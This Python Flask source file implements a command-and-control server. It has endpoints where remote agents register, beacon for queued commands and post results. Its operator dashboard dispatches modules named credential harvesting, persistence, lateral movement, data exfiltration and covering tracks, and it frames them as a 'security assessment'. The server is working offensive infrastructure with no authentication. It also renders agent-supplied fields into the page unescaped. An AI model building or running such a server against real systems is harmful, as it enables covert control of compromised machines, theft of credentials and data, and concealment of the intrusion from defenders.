from flask import Flask, request, jsonify, render_template_string
from c2_operator.database import Database
from utils.crypto import encrypt_data, decrypt_data, generate_key
from utils.config import Config
import json
from datetime import datetime

app = Flask(__name__)
db = Database()
config = Config()

# Simple HTML dashboard
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Operator Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #00ff00; }
        h1 { color: #00ff00; }
        .section { margin: 20px 0; padding: 15px; background: #2a2a2a; border: 1px solid #00ff00; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; text-align: left; border: 1px solid #00ff00; }
        th { background: #3a3a3a; }
        .active { color: #00ff00; }
        .inactive { color: #ff0000; }
        button { background: #00ff00; color: #000; padding: 8px 15px; border: none; cursor: pointer; margin: 5px; }
        button:hover { background: #00cc00; }
        input, select { background: #2a2a2a; color: #00ff00; border: 1px solid #00ff00; padding: 5px; }
    </style>
</head>
<body>
    <h1>🎯 C2 Operator Dashboard</h1>
    
    <div class="section">
        <h2>Active Agents</h2>
        <div id="agents">Loading...</div>
    </div>
    
    <div class="section">
        <h2>Execute Security Assessment</h2>
        <select id="agentSelect">
            <option value="">Select Agent</option>
        </select>
        <select id="moduleSelect">
            <option value="privilege_escalation">Privilege Escalation</option>
            <option value="persistence">Persistence</option>
            <option value="credential_harvesting">Credential Harvesting</option>
            <option value="internal_reconnaissance">Internal Reconnaissance</option>
            <option value="lateral_movement">Lateral Movement</option>
            <option value="data_access">Data Access</option>
            <option value="data_exfiltration">Data Exfiltration</option>
            <option value="c2_check">C2 Check</option>
            <option value="covering_tracks">Covering Tracks</option>
        </select>
        <button onclick="executeModule()">Execute</button>
    </div>
    
    <div class="section">
        <h2>Recent Results</h2>
        <div id="results">Loading...</div>
    </div>
    
    <script>
        function loadAgents() {
            fetch('/api/agents')
                .then(r => r.json())
                .then(data => {
                    let html = '<table><tr><th>ID</th><th>Hostname</th><th>Platform</th><th>IP</th><th>Last Seen</th><th>Status</th></tr>';
                    let select = document.getElementById('agentSelect');
                    select.innerHTML = '<option value="">Select Agent</option>';
                    
                    data.agents.forEach(agent => {
                        html += `<tr><td>${agent.id}</td><td>${agent.hostname}</td><td>${agent.platform}</td><td>${agent.ip_address}</td><td>${agent.last_seen}</td><td class="${agent.status}">${agent.status}</td></tr>`;
                        select.innerHTML += `<option value="${agent.id}">${agent.hostname} (${agent.platform})</option>`;
                    });
                    html += '</table>';
                    document.getElementById('agents').innerHTML = html;
                });
        }
        
        function loadResults() {
            fetch('/api/results')
                .then(r => r.json())
                .then(data => {
                    let html = '<table><tr><th>Agent</th><th>Module</th><th>Timestamp</th><th>Result</th></tr>';
                    data.results.slice(0, 10).forEach(result => {
                        let resultPreview = result.result.substring(0, 100) + '...';
                        html += `<tr><td>${result.agent_id}</td><td>${result.module}</td><td>${result.timestamp}</td><td><pre>${resultPreview}</pre></td></tr>`;
                    });
                    html += '</table>';
                    document.getElementById('results').innerHTML = html;
                });
        }
        
        function executeModule() {
            const agentId = document.getElementById('agentSelect').value;
            const module = document.getElementById('moduleSelect').value;
            
            if (!agentId) {
                alert('Please select an agent');
                return;
            }
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({agent_id: agentId, module: module})
            })
            .then(r => r.json())
            .then(data => {
                alert('Command queued: ' + data.command_id);
                setTimeout(loadResults, 2000);
            });
        }
        
        setInterval(() => {
            loadAgents();
            loadResults();
        }, 5000);
        
        loadAgents();
        loadResults();
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    """Operator dashboard"""
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/agents', methods=['GET'])
def get_agents():
    """Get all agents"""
    agents = db.get_agents()
    return jsonify({'agents': agents})

@app.route('/api/agent/register', methods=['POST'])
def register_agent():
    """Agent registration endpoint"""
    data = request.json
    
    agent_id = data.get('agent_id')
    hostname = data.get('hostname')
    platform = data.get('platform')
    ip_address = request.remote_addr
    
    db.register_agent(agent_id, hostname, platform, ip_address)
    
    return jsonify({'status': 'registered', 'agent_id': agent_id})

@app.route('/api/agent/<agent_id>/beacon', methods=['POST'])
def agent_beacon(agent_id):
    """Agent beacon endpoint"""
    data = request.json
    
    # Update agent last seen
    agent = db.get_agent(agent_id)
    if agent:
        db.register_agent(agent_id, agent['hostname'], agent['platform'], request.remote_addr)
    
    # Get pending commands
    commands = db.get_pending_commands(agent_id)
    
    # Mark commands as sent
    for cmd in commands:
        db.update_command_status(cmd['id'], 'sent')
    
    return jsonify({'commands': commands})

@app.route('/api/agent/<agent_id>/result', methods=['POST'])
def submit_result(agent_id):
    """Agent result submission endpoint"""
    data = request.json
    
    command_id = data.get('command_id')
    module = data.get('module')
    result = data.get('result')
    
    db.add_result(agent_id, command_id, module, json.dumps(result))
    db.update_command_status(command_id, 'completed')
    
    return jsonify({'status': 'received'})

@app.route('/api/command', methods=['POST'])
def queue_command():
    """Queue a command for an agent"""
    data = request.json
    
    agent_id = data.get('agent_id')
    module = data.get('module')
    command = data.get('command', module)
    
    command_id = db.add_command(agent_id, command, module)
    
    return jsonify({'status': 'queued', 'command_id': command_id})

@app.route('/api/results', methods=['GET'])
def get_results():
    """Get results"""
    agent_id = request.args.get('agent_id')
    module = request.args.get('module')
    
    results = db.get_results(agent_id, module)
    
    return jsonify({'results': results})

def start_server(host='0.0.0.0', port=5000):
    """Start the C2 server"""
    print(f"[+] Starting C2 Operator Server on {host}:{port}")
    print(f"[+] Dashboard: http://{host}:{port}")
    app.run(host=host, port=port, debug=False)

if __name__ == '__main__':
    start_server()
